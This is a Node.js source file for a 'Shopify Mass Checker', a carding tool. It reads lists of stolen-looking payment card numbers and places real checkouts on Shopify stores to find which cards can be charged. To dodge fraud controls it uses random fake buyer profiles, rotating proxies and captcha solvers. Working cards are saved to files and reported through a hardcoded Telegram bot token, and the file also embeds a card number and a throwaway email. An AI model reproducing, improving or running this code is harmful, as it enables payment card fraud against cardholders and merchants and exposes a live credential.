#!/usr/bin/env node

/**
 * Shopify Mass Checker Bot - Complete Integration
 * Uses ALL existing modules: site.js, browserCaptchaSolver.js, addresses.js, 
 * phoneGenerator.js, userAgent.js, hCaptchaSolver.js, queries.js
 */

import fs from 'fs';
import path from 'path';
import readline from 'readline';
import { fileURLToPath } from 'url';

// Get current directory
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Import ALL your modules
import ShopifyCheckout from './site.js';
import BrowserCaptchaSolver from './browserCaptchaSolver.js';
import { getRandomAddress, getAddressByCountry, addressesByCountry } from './addresses.js';
import { generatePhone } from './phoneGenerator.js';
import UserAgent from './userAgent.js';
import HCaptchaSolver from './hCaptchaSolver.js';
import queries from './queries.js';

// Colors for console output
const Colors = {
    RED: '\x1b[91m',
    GREEN: '\x1b[92m',
    YELLOW: '\x1b[93m',
    BLUE: '\x1b[94m',
    MAGENTA: '\x1b[95m',
    CYAN: '\x1b[96m',
    WHITE: '\x1b[97m',
    BOLD: '\x1b[1m',
    RESET: '\x1b[0m'
};

// ══════════════════════════════════════════════════════════════════════════════
//                              📱 TELEGRAM CONFIG
// ══════════════════════════════════════════════════════════════════════════════

// ══════════════════════════════════════════════════════════════════════════════
// ⚠️  ONLY ADD YOUR BOT TOKEN HERE ⚠️
// Get it from @BotFather on Telegram
// Example: '8305972211:AAGpfN5uiUMqXCw3KjmF07MN059SMggDGJ4'
const TELEGRAM_BOT_TOKEN = '7897881067:AAHAJb8QCLbW1oBcfaDNkaULpNwYaiPtiJA';
// ══════════════════════════════════════════════════════════════════════════════

// Telegram notifications are handled by the ShopifyCheckout class
// No chat ID needed - the bot token alone is sufficient

// Global state
let stats = { charged: 0, '3ds': 0, declined: 0, error: 0, total: 0, current: 0 };
let USE_PROXY = false;
let proxiesList = [];
let startTime = Date.now();

// Test card for validation
const TEST_CARD = "4986901559611040|07|27|824";

/**
 * Parse card and return object for ShopifyCheckout
 */
function parseCard(cardString) {
    const parts = cardString.split('|');
    if (parts.length < 4) return null;
    
    return {
        number: parts[0].replace(/\s/g, ''),
        month: parts[1].padStart(2, '0'),
        year: parts[2],
        cvv: parts[3],
        name: 'John Smith'
    };
}

/**
 * Create random profile using addresses.js and phoneGenerator.js
 */
function getRandomProfile(country = 'US') {
    const firstNames = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles'];
    const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
    
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    
    // Generate random email
    const randomStr = Math.random().toString(36).substring(2, 10);
    const email = `c9wnhvxp@mailsiutoc.com`;
    
    // Get address by country using addresses.js
    const address = getAddressByCountry(country);
    
    // Generate phone using phoneGenerator.js
    const phone = generatePhone('international');
    
    return {
        firstName,
        lastName,
        email,
        ...address,
        phone
    };
}

/**
 * Check if card is expired
 */
function isCardExpired(cardString) {
    try {
        const parts = cardString.split('|');
        if (parts.length < 4) return true;
        
        const mm = parseInt(parts[1]);
        let yy = parts[2];
        
        // Convert year to 4 digits
        let year;
        if (yy.length === 2) {
            year = 2000 + parseInt(yy);
        } else {
            year = parseInt(yy);
        }
        
        // Get current date
        const now = new Date();
        const currentYear = now.getFullYear();
        const currentMonth = now.getMonth() + 1;
        
        // Check if expired
        if (year < currentYear) {
            return true;
        } else if (year === currentYear && mm < currentMonth) {
            return true;
        }
        
        return false;
    } catch (error) {
        return true;
    }
}

/**
 * Load cards from file and filter out expired ones
 */
function loadCards(filePath) {
    try {
        if (!fs.existsSync(filePath)) {
            return [];
        }
        
        const data = fs.readFileSync(filePath, 'utf8');
        const lines = data.split('\n');
        const cards = [];
        let expiredCount = 0;
        
        for (const line of lines) {
            const trimmed = line.trim();
            if (trimmed.includes('|') && trimmed.split('|').length >= 4) {
                // Check if expired
                if (isCardExpired(trimmed)) {
                    expiredCount++;
                    continue;
                }
                cards.push(trimmed);
            }
        }
        
        if (expiredCount > 0) {
            console.log(`${Colors.YELLOW}⚠️  Removed ${expiredCount} expired cards${Colors.RESET}`);
        }
        
        return cards;
    } catch (error) {
        return [];
    }
}

/**
 * Load shops from file
 */
function loadShops(filePath) {
    try {
        if (!fs.existsSync(filePath)) {
            return [];
        }
        
        const data = fs.readFileSync(filePath, 'utf8');
        const lines = data.split('\n');
        const shops = new Set();
        
        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed || trimmed.startsWith('#')) continue;
            
            let domain = null;
            
            // Extract domain from various formats
            const firstPart = trimmed.split(/\s*\|\s*|\t+|\s\s+/)[0].trim();
            
            if (firstPart.startsWith('http://') || firstPart.startsWith('https://')) {
                // Remove scheme
                const temp = firstPart.replace(/^https?:\/\//, '');
                // Extract domain
                const match = temp.match(/^([a-zA-Z0-9][-a-zA-Z0-9.]*[a-zA-Z0-9])(?::\d+)?(?:\/|:|$)/);
                domain = match ? match[1] : temp.split('/')[0].split(':')[0];
            } else {
                const parts = firstPart.split(':');
                domain = parts[0].trim();
            }
            
            if (domain) {
                domain = domain.toLowerCase().trim();
                
                // Remove www.
                if (domain.startsWith('www.')) {
                    domain = domain.substring(4);
                }
                
                // Remove trailing dots
                domain = domain.replace(/\.+$/, '');
                
                // Validate domain
                if (domain.includes('.') && domain.length >= 4) {
                    if (/^[a-z0-9][-a-z0-9.]*[a-z0-9]$/.test(domain)) {
                        shops.add(`https://${domain}`);
                    }
                }
            }
        }
        
        return Array.from(shops);
    } catch (error) {
        return [];
    }
}

/**
 * Load proxies from file
 */
function loadProxies(filePath) {
    try {
        if (!fs.existsSync(filePath)) {
            return [];
        }
        
        const data = fs.readFileSync(filePath, 'utf8');
        const lines = data.split('\n');
        const proxies = [];
        
        for (const line of lines) {
            const trimmed = line.trim();
            if (trimmed && !trimmed.startsWith('#')) {
                proxies.push(trimmed);
            }
        }
        
        return proxies;
    } catch (error) {
        return [];
    }
}

/**
 * Parse proxy string to object format for ShopifyCheckout
 */
function parseProxy(proxyString) {
    if (!proxyString) return null;
    
    // Clean proxy string
    proxyString = proxyString.trim().replace(/[@\}\{\[\]!#$%^&*()+=<>?\/"'\\]+$/, '');
    
    // Parse format: user:pass@ip:port or ip:port:user:pass
    if (proxyString.includes('@')) {
        const [auth, host] = proxyString.split('@');
        return { host, auth };
    }
    
    const parts = proxyString.split(':');
    if (parts.length === 4) {
        // Check if IP:Port:User:Pass or User:Pass:IP:Port
        if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(parts[0])) {
            return { host: `${parts[0]}:${parts[1]}`, auth: `${parts[2]}:${parts[3]}` };
        } else {
            return { host: `${parts[2]}:${parts[3]}`, auth: `${parts[0]}:${parts[1]}` };
        }
    } else if (parts.length === 2) {
        return { host: proxyString, auth: null };
    }
    
    return null;
}

/**
 * Get random proxy from list
 */
function getRandomProxy() {
    if (!USE_PROXY || proxiesList.length === 0) {
        return null;
    }
    
    const proxyString = proxiesList[Math.floor(Math.random() * proxiesList.length)];
    return proxyString;
}

/**
 * Print result with colors
 */
function printResult(status, card, message, shopDomain = '', amount = '', orderUrl = '') {
    const shopStr = shopDomain ? ` | ${Colors.YELLOW}${shopDomain}${Colors.RESET}` : '';
    const amountStr = amount ? ` | ${Colors.GREEN}${amount}${Colors.RESET}` : '';
    const urlStr = orderUrl ? ` | ${Colors.CYAN}${orderUrl}${Colors.RESET}` : '';
    
    let statusColor = Colors.RED;
    let statusText = '[ERROR]';
    
    switch (status.toUpperCase()) {
        case 'CHARGED':
            statusColor = Colors.GREEN + Colors.BOLD;
            statusText = '[CHARGED]';
            break;
        case '3DS':
            statusColor = Colors.CYAN;
            statusText = '[3DS]';
            break;
        case 'DECLINED':
            statusColor = Colors.RED;
            statusText = '[DECLINED]';
            break;
    }
    
    console.log(`${statusColor}${statusText}${Colors.RESET} --> ${Colors.WHITE}${card}${Colors.RESET} --> ${message}${shopStr}${amountStr}${urlStr}`);
}

/**
 * Print statistics bar
 */
function printStatsBar() {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const mins = Math.floor(elapsed / 60);
    const secs = elapsed % 60;
    
    console.log(`\n${Colors.MAGENTA}${'═'.repeat(80)}${Colors.RESET}`);
    console.log(`  ${Colors.GREEN}Charged: ${stats.charged}${Colors.RESET} | ${Colors.CYAN}3DS: ${stats['3ds']}${Colors.RESET} | ${Colors.RED}Declined: ${stats.declined}${Colors.RESET} | ${Colors.RED}Error: ${stats.error}${Colors.RESET}`);
    console.log(`  Time: ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')} | Total: ${stats.total}`);
    console.log(`${Colors.MAGENTA}${'═'.repeat(80)}${Colors.RESET}\n`);
}

/**
 * Print banner
 */
function printBanner() {
    console.clear();
    console.log(`${Colors.MAGENTA}╔══════════════════════════════════════════════════════════════════════════════╗`);
    console.log(`${Colors.CYAN}                    🛒 SHOPIFY MASS CHECKER v2.0 🛒                            ${Colors.MAGENTA}║`);
    console.log(`${Colors.YELLOW}                   Multi-Shop | Multi-Thread | Auto Retry                     ${Colors.MAGENTA}║`);
    console.log(`${Colors.GREEN}                        Full Flow: Cart → Checkout → Charge                   ${Colors.MAGENTA}║`);
    console.log(`${Colors.MAGENTA}╚══════════════════════════════════════════════════════════════════════════════╝${Colors.RESET}\n`);
}

/**
 * Create readline interface for user input
 */
function createInterface() {
    return readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
}

/**
 * Prompt for user input
 */
function prompt(rl, question) {
    return new Promise((resolve) => {
        rl.question(question, (answer) => {
            resolve(answer);
        });
    });
}

/**
 * Check card on shop using ShopifyCheckout class
 */
async function checkCardOnShop(card, shopUrl, proxy = null) {
    const shopDomain = new URL(shopUrl).hostname;
    
    try {
        // Parse card
        const cardObj = parseCard(card);
        if (!cardObj) {
            return { status: 'ERROR', message: 'Invalid card format', shop: shopDomain };
        }
        
        // Create profile
        const profile = getRandomProfile('US');
        
        // Prepare options for ShopifyCheckout
        const options = {
            domain: shopDomain,
            card: cardObj,
            profile: profile,
            proxy: proxy,
            telegramToken: TELEGRAM_BOT_TOKEN, // Pass the bot token to ShopifyCheckout
            telegramChatId: null // No chat ID needed
        };
        
        // Create checkout instance
        const checker = new ShopifyCheckout(options);
        
        // Run checkout
        const result = await checker.run();
        
        // Map result to our format
        if (result.success) {
            if (result.status === 'Charged') {
                return {
                    status: 'CHARGED',
                    message: result.message || 'Order Confirmed',
                    shop: shopDomain,
                    amount: result.total || 'N/A',
                    orderId: result.orderId || '',
                    email: profile.email,
                    gateway: result.gateway || 'Unknown'
                };
            } else if (result.status === '3DS') {
                return {
                    status: '3DS',
                    message: result.message || '3D Secure Required',
                    shop: shopDomain,
                    amount: result.total || 'N/A'
                };
            } else if (result.status === 'Declined') {
                return {
                    status: 'DECLINED',
                    message: result.message || 'Card Declined',
                    shop: shopDomain,
                    amount: result.total || 'N/A'
                };
            } else if (result.status === 'Live') {
                return {
                    status: 'DECLINED',
                    message: result.message || 'Card Live',
                    shop: shopDomain,
                    amount: result.total || 'N/A'
                };
            }
        }
        
        return {
            status: 'ERROR',
            message: result.message || 'Unknown error',
            shop: shopDomain
        };
        
    } catch (error) {
        return {
            status: 'ERROR',
            message: error.message || 'Exception occurred',
            shop: shopDomain
        };
    }
}

/**
 * Check card with retry logic (tries multiple shops)
 */
async function checkCardWithRetry(card, shops) {
    const triedShops = new Set();
    const availableShops = [...shops];
    const maxRetries = 3;
    
    for (let attempt = 0; attempt < maxRetries; attempt++) {
        // Reset tried shops if we've tried all
        if (triedShops.size >= availableShops.length) {
            triedShops.clear();
        }
        
        // Find a shop we haven't tried
        const untriedShops = availableShops.filter(shop => !triedShops.has(shop));
        if (untriedShops.length === 0) break;
        
        const shopUrl = untriedShops[Math.floor(Math.random() * untriedShops.length)];
        triedShops.add(shopUrl);
        
        // Get proxy if enabled
        const proxy = USE_PROXY ? getRandomProxy() : null;
        
        // Check card on this shop
        const result = await checkCardOnShop(card, shopUrl, proxy);
        
        // If we got a definitive result (not an error that suggests retry), return it
        if (result.status !== 'ERROR' || 
            !result.message.toLowerCase().includes('captcha') &&
            !result.message.toLowerCase().includes('no products') &&
            !result.message.toLowerCase().includes('timeout')) {
            return result;
        }
        
        // Wait a bit before retry
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    return {
        status: 'ERROR',
        message: 'All shops failed after retries',
        shop: 'N/A'
    };
}

/**
 * Mode 1: Single Shop
 */
async function modeSingleShop(rl) {
    console.log(`\n${Colors.CYAN}[MODE 1] Single Shop - Validate & Check Cards${Colors.RESET}`);
    console.log(`${Colors.MAGENTA}${'─'.repeat(60)}${Colors.RESET}`);
    
    // Get shop URL
    let shopUrl = (await prompt(rl, `${Colors.YELLOW}[?] Shop URL: ${Colors.RESET}`)).trim();
    if (!shopUrl) return;
    if (!shopUrl.startsWith('http')) {
        shopUrl = 'https://' + shopUrl;
    }
    shopUrl = shopUrl.replace(/\/$/, '');
    
    // Get card file
    let cardFile = (await prompt(rl, `${Colors.YELLOW}[?] Card file (default: card.txt): ${Colors.RESET}`)).trim();
    if (!cardFile) cardFile = 'card.txt';
    
    // Load cards
    const cards = loadCards(cardFile);
    if (cards.length === 0) {
        console.log(`${Colors.RED}[!] No cards found in ${cardFile}!${Colors.RESET}`);
        return;
    }
    
    // Reset stats
    stats = { charged: 0, '3ds': 0, declined: 0, error: 0, total: cards.length, current: 0 };
    startTime = Date.now();
    
    // Output files
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[0];
    const outputFile = `Charged_Shopify_${timestamp}.txt`;
    const output3dsFile = "3DS_Cards.txt";
    
    console.log(`\n${Colors.CYAN}📁 Cards:${Colors.RESET} ${cards.length}`);
    console.log(`${Colors.CYAN}🛒 Shop:${Colors.RESET} ${shopUrl}`);
    if (USE_PROXY) {
        console.log(`${Colors.CYAN}🌐 Proxies:${Colors.RESET} ${proxiesList.length}`);
    }
    console.log(`${Colors.CYAN}📄 Output Charged:${Colors.RESET} ${outputFile}`);
    console.log(`${Colors.CYAN}📄 Output 3DS:${Colors.RESET} ${output3dsFile}`);
    console.log(`${Colors.MAGENTA}${'═'.repeat(80)}${Colors.RESET}\n`);
    
    const shopDomain = new URL(shopUrl).hostname;
    
    // Process each card
    for (let i = 0; i < cards.length; i++) {
        const card = cards[i];
        stats.current = i + 1;
        
        console.log(`${Colors.CYAN}[${i+1}/${cards.length}] Checking ${card.substring(0, 8)}...${Colors.RESET}`);
        
        // Get proxy if enabled
        const proxy = USE_PROXY ? getRandomProxy() : null;
        
        const result = await checkCardOnShop(card, shopUrl, proxy);
        
        // Update stats
        if (result.status === 'CHARGED') {
            stats.charged++;
            printResult('CHARGED', card, result.message, shopDomain, result.amount, result.orderId);
            
            // Save to file
            fs.appendFileSync(outputFile, 
                `${card} | CHARGED | ${result.message} | ${shopDomain} | ${result.amount} | ${result.email || 'N/A'} | ${result.orderId || 'N/A'}\n`,
                'utf8'
            );
        } else if (result.status === '3DS') {
            stats['3ds']++;
            printResult('3DS', card, result.message, shopDomain, result.amount);
            
            // Save to 3DS file
            fs.appendFileSync(output3dsFile,
                `${card} | 3DS | ${result.message} | ${shopDomain} | ${result.amount}\n`,
                'utf8'
            );
        } else if (result.status === 'DECLINED') {
            stats.declined++;
            printResult('DECLINED', card, result.message, shopDomain, result.amount);
        } else {
            stats.error++;
            printResult('ERROR', card, result.message, shopDomain);
        }
    }
    
    printStatsBar();
    
    if (stats.charged > 0) {
        console.log(`${Colors.GREEN}✓ Charged cards saved to: ${outputFile}${Colors.RESET}`);
    }
    if (stats['3ds'] > 0) {
        console.log(`${Colors.CYAN}✓ 3DS cards saved to: ${output3dsFile}${Colors.RESET}`);
    }
}

/**
 * Mode 2: Multi Shop
 */
async function modeMultiShop(rl) {
    console.log(`\n${Colors.CYAN}[MODE 2] Multi Shop - Random Shop per Card${Colors.RESET}`);
    console.log(`${Colors.MAGENTA}${'─'.repeat(60)}${Colors.RESET}`);
    
    // Get shop file
    let shopFile = (await prompt(rl, `${Colors.YELLOW}[?] Shop file (default: shops.txt): ${Colors.RESET}`)).trim();
    if (!shopFile) shopFile = 'shops.txt';
    
    // Get card file
    let cardFile = (await prompt(rl, `${Colors.YELLOW}[?] Card file (default: card.txt): ${Colors.RESET}`)).trim();
    if (!cardFile) cardFile = 'card.txt';
    
    // Load shops and cards
    const shops = loadShops(shopFile);
    const cards = loadCards(cardFile);
    
    if (shops.length === 0) {
        console.log(`${Colors.RED}[!] No shops found in ${shopFile}!${Colors.RESET}`);
        return;
    }
    
    if (cards.length === 0) {
        console.log(`${Colors.RED}[!] No cards found in ${cardFile}!${Colors.RESET}`);
        return;
    }
    
    // Reset stats
    stats = { charged: 0, '3ds': 0, declined: 0, error: 0, total: cards.length, current: 0 };
    startTime = Date.now();
    
    // Output files
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[0];
    const outputFile = `Charged_Shopify_${timestamp}.txt`;
    const output3dsFile = "3DS_Cards.txt";
    
    console.log(`\n${Colors.CYAN}📁 Cards:${Colors.RESET} ${cards.length}`);
    console.log(`${Colors.CYAN}🛒 Shops:${Colors.RESET} ${shops.length}`);
    if (USE_PROXY) {
        console.log(`${Colors.CYAN}🌐 Proxies:${Colors.RESET} ${proxiesList.length}`);
    }
    console.log(`${Colors.CYAN}📄 Output Charged:${Colors.RESET} ${outputFile}`);
    console.log(`${Colors.CYAN}📄 Output 3DS:${Colors.RESET} ${output3dsFile}`);
    console.log(`${Colors.MAGENTA}${'═'.repeat(80)}${Colors.RESET}\n`);
    
    // Process each card
    for (let i = 0; i < cards.length; i++) {
        const card = cards[i];
        stats.current = i + 1;
        
        console.log(`${Colors.CYAN}[${i+1}/${cards.length}] Checking card...${Colors.RESET}`);
        
        const result = await checkCardWithRetry(card, shops);
        
        // Update stats
        if (result.status === 'CHARGED') {
            stats.charged++;
            printResult('CHARGED', card, result.message, result.shop, result.amount, result.orderId);
            
            // Save to file
            fs.appendFileSync(outputFile, 
                `${card} | CHARGED | ${result.message} | ${result.shop} | ${result.amount} | ${result.email || 'N/A'} | ${result.orderId || 'N/A'}\n`,
                'utf8'
            );
        } else if (result.status === '3DS') {
            stats['3ds']++;
            printResult('3DS', card, result.message, result.shop, result.amount);
            
            // Save to 3DS file
            fs.appendFileSync(output3dsFile,
                `${card} | 3DS | ${result.message} | ${result.shop} | ${result.amount}\n`,
                'utf8'
            );
        } else if (result.status === 'DECLINED') {
            stats.declined++;
            printResult('DECLINED', card, result.message, result.shop, result.amount);
        } else {
            stats.error++;
            printResult('ERROR', card, result.message, result.shop);
        }
    }
    
    printStatsBar();
    
    if (stats.charged > 0) {
        console.log(`${Colors.GREEN}✓ Charged cards saved to: ${outputFile}${Colors.RESET}`);
    }
    if (stats['3ds'] > 0) {
        console.log(`${Colors.CYAN}✓ 3DS cards saved to: ${output3dsFile}${Colors.RESET}`);
    }
}

/**
 * Main function
 */
async function main() {
    printBanner();
    
    const rl = createInterface();
    
    try {
        // Check if bot token is set
        if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
            console.log(`${Colors.YELLOW}⚠️  Telegram notifications disabled - set your bot token in the code${Colors.RESET}`);
        } else {
            console.log(`${Colors.GREEN}✓ Telegram notifications enabled${Colors.RESET}`);
        }
        
        // Ask for proxy
        const useProxyInput = (await prompt(rl, `${Colors.YELLOW}[?] Use proxy? (y/n):${Colors.RESET} `)).toLowerCase();
        USE_PROXY = useProxyInput === 'y';
        
        if (USE_PROXY) {
            const proxyFile = (await prompt(rl, `${Colors.YELLOW}[?] Proxy file (default: proxy.txt): ${Colors.RESET}`)).trim() || 'proxy.txt';
            proxiesList = loadProxies(proxyFile);
            if (proxiesList.length > 0) {
                console.log(`${Colors.GREEN}[+] Loaded ${proxiesList.length} proxies${Colors.RESET}`);
            } else {
                console.log(`${Colors.RED}[!] No proxies found - running without proxy${Colors.RESET}`);
                USE_PROXY = false;
            }
        }
        
        console.log();
        console.log(`${Colors.CYAN}Select mode:${Colors.RESET}`);
        console.log(`${Colors.GREEN}[1]${Colors.RESET} Single Shop - Validate & Check Cards`);
        console.log(`${Colors.GREEN}[2]${Colors.RESET} Multi Shop - Random Shop per Card`);
        console.log();
        
        const mode = await prompt(rl, `${Colors.YELLOW}[?] Mode (1/2): ${Colors.RESET}`);
        
        // Reset stats
        stats = { charged: 0, '3ds': 0, declined: 0, error: 0, total: 0, current: 0 };
        
        if (mode === '1') {
            await modeSingleShop(rl);
        } else if (mode === '2') {
            await modeMultiShop(rl);
        } else {
            console.log(`${Colors.RED}[!] Invalid mode!${Colors.RESET}`);
        }
    } finally {
        rl.close();
    }
}

// Run the main function
main().catch(console.error);
